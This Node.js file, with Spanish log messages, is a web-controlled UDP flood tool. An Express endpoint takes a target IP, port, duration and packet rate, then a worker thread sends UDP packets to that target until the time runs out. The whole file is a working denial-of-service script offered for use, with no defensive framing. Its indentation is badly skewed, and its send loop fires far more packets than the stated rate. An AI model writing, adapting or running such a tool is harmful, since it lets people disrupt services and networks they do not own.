const express = require('express');
const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const app = express();
const port = 3000;

app.use(express.json());
app.use(express.static('public'));

app.post('/start-udp', (req, res) => {
    const { ip, port, time, pps } = req.body;
    
        const worker = new Worker(__filename, {
                workerData: { ip, port, time, pps }
                    });
                    
                        worker.on('message', (msg) => {
                                if (msg.error) {
                                            console.error(`Error: ${msg.error}`);
                                                    } else {
                                                                console.log(`Paquetes enviados: ${msg.packetsSent}`);
                                                                        }
                                                                            });
                                                                            
                                                                                worker.on('error', (err) => {
                                                                                        console.error(`Error en el worker: ${err.message}`);
                                                                                            });
                                                                                            
                                                                                                worker.on('exit', (code) => {
                                                                                                        if (code !== 0) {
                                                                                                                    console.error(`Worker finalizado con código de salida ${code}`);
                                                                                                                            }
                                                                                                                                });
                                                                                                                                
                                                                                                                                    res.sendStatus(200);
                                                                                                                                    });
                                                                                                                                    
                                                                                                                                    if (isMainThread) {
                                                                                                                                        app.listen(port, () => {
                                                                                                                                                console.log(`Servidor escuchando en http://localhost:${port}`);
                                                                                                                                                    });
                                                                                                                                                    } else {
                                                                                                                                                        const { ip, port, time, pps } = workerData;
                                                                                                                                                            const udpClient = dgram.createSocket('udp4');
                                                                                                                                                                const packet = Buffer.from('UDP Packet');
                                                                                                                                                                    let packetsSent = 0;
                                                                                                                                                                    
                                                                                                                                                                        const interval = setInterval(() => {
                                                                                                                                                                                for (let i = 0; i < pps; i++) {
                                                                                                                                                                                            udpClient.send(packet, port, ip, (err) => {
                                                                                                                                                                                                            if (err) {
                                                                                                                                                                                                                                console.error(err);
                                                                                                                                                                                                                                                } else {
                                                                                                                                                                                                                                                                    packetsSent++;
                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                });
                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                            }, 1000 / pps);
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                setTimeout(() => {
                                                                                                                                                                                                                                                                                                                        clearInterval(interval);
                                                                                                                                                                                                                                                                                                                                udpClient.close();
                                                                                                                                                                                                                                                                                                                                        parentPort.postMessage({ packetsSent });
                                                                                                                                                                                                                                                                                                                                            }, time * 1000);
                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                            
